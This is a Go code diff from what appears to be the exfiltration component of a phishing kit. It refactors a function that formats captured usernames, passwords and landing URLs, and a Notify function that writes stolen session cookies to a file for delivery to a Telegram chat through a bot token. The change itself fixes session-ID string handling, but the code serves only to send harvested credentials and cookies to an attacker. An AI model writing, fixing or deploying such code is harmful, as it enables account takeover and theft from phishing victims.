@@ -44,7 +44,6 @@ func createTxtFile(cookieJSON string) (string, error) {
 
 func formatSessionMessage(session TSession) string {
 	return fmt.Sprintf("✨ Session Information ✨\n\n"+
-
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n \n"+
@@ -68,9 +67,10 @@ func formatSessionMessage(session TSession) string {
 func Notify(session TSession, cookieJSON string, chatid string, teletoken string) {
 
 	mu.Lock()
-	if processedSessions[string(session.ID)] {
+	sessionID := fmt.Sprint(session.ID)
+	if processedSessions[sessionID] {
 		mu.Unlock()
-		messageID, exists := sessionMessageMap[string(session.ID)]
+		messageID, exists := sessionMessageMap[sessionID]
 		if exists {
 			txtFilePath, err := createTxtFile(cookieJSON)
 			if err != nil {
@@ -84,12 +84,12 @@ func Notify(session TSession, cookieJSON string, chatid string, teletoken string
 			}
 			os.Remove(txtFilePath)
 		} else {
-			fmt.Println("Message ID not found for session:", session.ID)
+			fmt.Println("Message ID not found for session:", sessionID)
 		}
 		return
 	}
 
-	processedSessions[string(session.ID)] = true
+	processedSessions[sessionID] = true
 	mu.Unlock()
 
 	txtFilePath, err := createTxtFile(cookieJSON)
@@ -108,7 +108,7 @@ func Notify(session TSession, cookieJSON string, chatid string, teletoken string
 	}
 
 	mu.Lock()
-	sessionMessageMap[string(session.ID)] = messageID
+	sessionMessageMap[sessionID] = messageID
 	mu.Unlock()
 
 	os.Remove(txtFilePath)
